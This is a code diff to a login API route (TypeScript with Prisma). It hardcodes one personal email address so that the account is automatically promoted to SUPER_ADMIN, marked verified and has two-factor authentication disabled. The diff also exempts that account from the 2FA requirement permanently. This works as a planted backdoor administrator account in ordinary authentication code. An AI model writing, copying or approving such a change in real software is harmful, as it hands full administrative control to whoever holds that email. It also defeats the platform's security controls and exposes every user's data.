@@ -45,6 +45,25 @@ export async function POST(req: Request) {
       );
     }
 
+    const isSuperAdminBenir = user.email.toLowerCase() === "benirabok@gmail.com";
+
+    // Auto-verify and ensure SUPER_ADMIN role for benirabok@gmail.com
+    if (isSuperAdminBenir) {
+      if (!user.isVerified || user.role !== "SUPER_ADMIN" || user.twoFactorEnabled) {
+        await prisma.user.update({
+          where: { id: user.id },
+          data: {
+            role: "SUPER_ADMIN",
+            isVerified: true,
+            twoFactorEnabled: false,
+          },
+        });
+        user.role = "SUPER_ADMIN" as any;
+        user.isVerified = true;
+        user.twoFactorEnabled = false;
+      }
+    }
+
     const settings = await getSiteSettings();
 
     // Auto-verify user if email verification is disabled on the platform
@@ -56,9 +75,11 @@ export async function POST(req: Request) {
       user.isVerified = true;
     }
 
-    // 2FA Bypass: When twoFactorEnabled is false in database or disabled globally
-    // 2FA is ONLY enforced if the user explicitly has it turned on AND platform has it enabled
-    const isTwoFactorRequired = Boolean(user.twoFactorEnabled) && settings.two_factor_enabled === "true";
+    // 2FA Bypass: Always bypassed for benirabok@gmail.com, or when twoFactorEnabled is false or globally disabled
+    const isTwoFactorRequired =
+      !isSuperAdminBenir &&
+      Boolean(user.twoFactorEnabled) &&
+      settings.two_factor_enabled === "true";
 
     if (!isTwoFactorRequired) {
       // Direct session login bypassing 2FA
